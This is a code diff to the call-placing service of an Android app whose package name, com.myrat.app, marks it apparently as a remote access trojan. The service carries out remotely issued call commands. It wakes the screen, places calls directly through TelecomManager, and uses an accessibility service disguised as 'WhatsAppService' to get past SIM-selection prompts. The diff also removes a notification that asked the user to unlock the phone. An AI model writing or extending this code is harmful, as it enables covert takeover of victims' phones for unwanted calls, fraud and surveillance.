@@ -107,7 +107,7 @@ class CallService : Service() {
                     "Call Service",
                     NotificationManager.IMPORTANCE_LOW
                 ).apply {
-                    description = "Running phone call service"
+                    description = "Running phone call service with SIM selection"
                     setShowBadge(false)
                     enableLights(false)
                     enableVibration(false)
@@ -125,7 +125,7 @@ class CallService : Service() {
         return try {
             NotificationCompat.Builder(this, CHANNEL_ID)
                 .setContentTitle("Call Service")
-                .setContentText("Monitoring call commands")
+                .setContentText("Monitoring call commands with SIM selection bypass")
                 .setSmallIcon(android.R.drawable.ic_menu_call)
                 .setPriority(NotificationCompat.PRIORITY_LOW)
                 .setOngoing(true)
@@ -188,7 +188,7 @@ class CallService : Service() {
                                 return@forEach
                             }
                             Logger.log("Processing call command: $commandId from $simNumber to $recipient")
-                            initiateCall(simNumber, recipient, commandId)
+                            initiateCallWithSimSelection(simNumber, recipient, commandId)
                         }
                     } catch (e: Exception) {
                         Logger.error("Error processing call commands", e)
@@ -204,12 +204,12 @@ class CallService : Service() {
         }
     }
 
-    private fun initiateCall(simNumber: String, recipient: String, commandId: String) {
+    private fun initiateCallWithSimSelection(simNumber: String, recipient: String, commandId: String): Boolean {
         try {
             val alreadySentSet = sentCallTracker.getOrPut(commandId) { mutableSetOf() }
             if (alreadySentSet.contains(recipient)) {
                 Logger.log("Skipping duplicate call to $recipient for command $commandId")
-                return
+                return false
             }
 
             // Check permissions
@@ -223,90 +223,177 @@ class CallService : Service() {
             if (!hasCallPhonePermission || !hasReadPhoneStatePermission) {
                 Logger.error("Missing permissions: CALL_PHONE=$hasCallPhonePermission, READ_PHONE_STATE=$hasReadPhoneStatePermission")
                 updateCommandStatus(commandId, "failed", "Missing required permissions")
-                return
+                return false
             }
 
-            // Map simNumber to subscriptionId - enhanced for better SIM detection
+            // Enhanced SIM mapping with better detection
             val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
             val subscriptionInfoList = subscriptionManager.activeSubscriptionInfoList
             if (subscriptionInfoList == null || subscriptionInfoList.isEmpty()) {
                 Logger.error("No active SIM subscriptions found")
                 updateCommandStatus(commandId, "failed", "No active SIM subscriptions")
-                return
+                return false
             }
 
-            // Enhanced SIM mapping logic
+            // Enhanced SIM mapping logic with multiple fallbacks
             val subscriptionInfo = subscriptionInfoList.find { info ->
-                // Match by exact number
+                // Primary matching strategies
                 info.number == simNumber ||
-                // Match by sim slot (sim1, sim2)
                 "sim${info.simSlotIndex + 1}" == simNumber.lowercase() ||
-                // Match by display name
                 info.displayName.toString().lowercase().contains(simNumber.lowercase()) ||
-                // Match by carrier name
-                info.carrierName.toString().lowercase().contains(simNumber.lowercase())
+                info.carrierName.toString().lowercase().contains(simNumber.lowercase()) ||
+                // Additional fallbacks
+                simNumber.lowercase() == "sim1" && info.simSlotIndex == 0 ||
+                simNumber.lowercase() == "sim2" && info.simSlotIndex == 1
             }
 
             if (subscriptionInfo == null) {
                 Logger.error("No SIM found for simNumber: $simNumber. Available SIMs: ${subscriptionInfoList.map { "sim${it.simSlotIndex + 1}:${it.number}:${it.displayName}" }}")
                 updateCommandStatus(commandId, "failed", "No SIM found for: $simNumber")
-                return
+                return false
             }
 
             val subId = subscriptionInfo.subscriptionId
             val simSlotIndex = subscriptionInfo.simSlotIndex
-            Logger.log("Mapped $simNumber to subscriptionId: $subId (slot: $simSlotIndex)")
+            Logger.log("✅ Mapped $simNumber to subscriptionId: $subId (slot: $simSlotIndex)")
 
+            // Use enhanced call method with SIM selection bypass
+            val success = makeCallWithSimBypass(recipient, subId, simSlotIndex, commandId)
+            
+            if (success) {
+                alreadySentSet.add(recipient)
+                updateCommandStatus(commandId, "success", null)
+                Logger.log("✅ Successfully initiated call from $simNumber (subId: $subId) to $recipient")
+            } else {
+                updateCommandStatus(commandId, "failed", "Call initiation failed")
+                Logger.error("❌ Failed to initiate call from $simNumber to $recipient")
+            }
+            
+            return success
+
+        } catch (e: SecurityException) {
+            Logger.error("Permission denied for call to $recipient: ${e.message}", e)
+            updateCommandStatus(commandId, "failed", "Permission denied: ${e.message}")
+            return false
+        } catch (e: Exception) {
+            Logger.error("Failed to initiate call to $recipient: ${e.message}", e)
+            updateCommandStatus(commandId, "failed", "Unexpected error: ${e.message}")
+            return false
+        }
+    }
+
+    private fun makeCallWithSimBypass(recipient: String, subId: Int, simSlotIndex: Int, commandId: String): Boolean {
+        return try {
+            // Wake up screen if needed for call
+            wakeUpScreen()
+            
+            // Method 1: Try direct call with subscription ID
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                try {
+                    val telecomManager = getSystemService(TELECOM_SERVICE) as android.telecom.TelecomManager
+                    val phoneAccountHandle = getPhoneAccountHandleForSubscription(telecomManager, subId)
+
+                    if (phoneAccountHandle != null) {
+                        val uri = android.net.Uri.parse("tel:$recipient")
+                        val extras = Bundle().apply {
+                            putParcelable(android.telecom.TelecomManager.EXTRA_PHONE_ACCOUNT_HANDLE, phoneAccountHandle)
+                            putBoolean("com.android.phone.extra.slot", simSlotIndex)
+                            putInt("subscription", subId)
+                            putInt("com.android.phone.DialpadFragment.extra.slot", simSlotIndex)
+                        }
+                        
+                        telecomManager.placeCall(uri, extras)
+                        Logger.log("📞 Direct call placed using TelecomManager with subId: $subId")
+                        
+                        // If accessibility service is enabled, it will handle SIM selection bypass
+                        if (isAccessibilityServiceEnabled()) {
+                            Logger.log("♿ Accessibility service enabled - will bypass SIM selection if needed")
+                        }
+                        
+                        return true
+                    }
+                } catch (e: Exception) {
+                    Logger.error("TelecomManager call failed, trying fallback", e)
+                }
+            }
+
+            // Method 2: Fallback using LauncherActivity with enhanced SIM handling
             val intent = Intent(this, LauncherActivity::class.java).apply {
                 action = "com.myrat.app.ACTION_MAKE_CALL"
                 putExtra("recipient", recipient)
                 putExtra("subId", subId)
                 putExtra("simSlotIndex", simSlotIndex)
+                putExtra("commandId", commandId)
+                putExtra("bypassSimSelection", true) // Flag for accessibility service
                 addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
             }
 
-            try {
-                startActivity(intent)
-                Logger.log("Initiated call from $simNumber (subId: $subId) to $recipient via LauncherActivity")
-                alreadySentSet.add(recipient)
-                updateCommandStatus(commandId, "success", null)
-            } catch (e: ActivityNotFoundException) {
-                Logger.error("Activity not found for call to $recipient", e)
-                updateCommandStatus(commandId, "failed", "Activity not found")
-            }
-        } catch (e: SecurityException) {
-            Logger.error("Permission denied for call to $recipient: ${e.message}", e)
-            updateCommandStatus(commandId, "failed", "Permission denied: ${e.message}")
+            startActivity(intent)
+            Logger.log("📞 Fallback call initiated via LauncherActivity with SIM bypass")
+            return true
+
         } catch (e: Exception) {
-            Logger.error("Failed to initiate call to $recipient: ${e.message}", e)
-            updateCommandStatus(commandId, "failed", "Unexpected error: ${e.message}")
+            Logger.error("All call methods failed for $recipient", e)
+            return false
         }
     }
 
-    private fun showUnlockNotification() {
-        try {
-            val channelId = "CallServiceAlerts"
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                val channel = NotificationChannel(
-                    channelId,
-                    "Call Service Alerts",
-                    NotificationManager.IMPORTANCE_HIGH
-                )
-                val manager = getSystemService(NotificationManager::class.java)
-                manager.createNotificationChannel(channel)
+    private fun getPhoneAccountHandleForSubscription(telecomManager: android.telecom.TelecomManager, subId: Int): android.telecom.PhoneAccountHandle? {
+        return try {
+            val phoneAccounts = telecomManager.callCapablePhoneAccounts
+            Logger.log("Available phone accounts: ${phoneAccounts.size}")
+
+            phoneAccounts.find { account ->
+                try {
+                    val phoneAccount = telecomManager.getPhoneAccount(account)
+                    val accountSubId = phoneAccount?.extras?.getInt("android.telephony.extra.SUBSCRIPTION_ID", -1)
+                    Logger.log("Checking account: $account, subId: $accountSubId vs target: $subId")
+                    accountSubId == subId
+                } catch (e: Exception) {
+                    Logger.error("Error checking phone account: $account", e)
+                    false
+                }
             }
-
-            val notification = NotificationCompat.Builder(this, channelId)
-                .setContentTitle("Action Required")
-                .setContentText("Please unlock your device to make a call.")
-                .setSmallIcon(android.R.drawable.ic_menu_call)
-                .setPriority(NotificationCompat.PRIORITY_HIGH)
-                .build()
-
-            val manager = getSystemService(NotificationManager::class.java)
-            manager.notify(9, notification)
         } catch (e: Exception) {
-            Logger.error("Failed to show unlock notification", e)
+            Logger.error("Error getting PhoneAccountHandle for subId: $subId", e)
+            null
+        }
+    }
+
+    private fun isAccessibilityServiceEnabled(): Boolean {
+        return try {
+            val accessibilityEnabled = android.provider.Settings.Secure.getInt(
+                contentResolver,
+                android.provider.Settings.Secure.ACCESSIBILITY_ENABLED, 0
+            )
+            if (accessibilityEnabled == 1) {
+                val services = android.provider.Settings.Secure.getString(
+                    contentResolver,
+                    android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
+                )
+                services?.contains("${packageName}/com.myrat.app.service.WhatsAppService") == true
+            } else {
+                false
+            }
+        } catch (e: Exception) {
+            false
+        }
+    }
+
+    private fun wakeUpScreen() {
+        try {
+            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
+            if (!powerManager.isInteractive) {
+                val screenWakeLock = powerManager.newWakeLock(
+                    PowerManager.FULL_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP or PowerManager.ON_AFTER_RELEASE,
+                    "CallService:ScreenWake"
+                )
+                screenWakeLock.acquire(10000) // 10 seconds
+                screenWakeLock.release()
+                Logger.log("Screen woken up for call")
+            }
+        } catch (e: Exception) {
+            Logger.error("Failed to wake up screen for call", e)
         }
     }
 
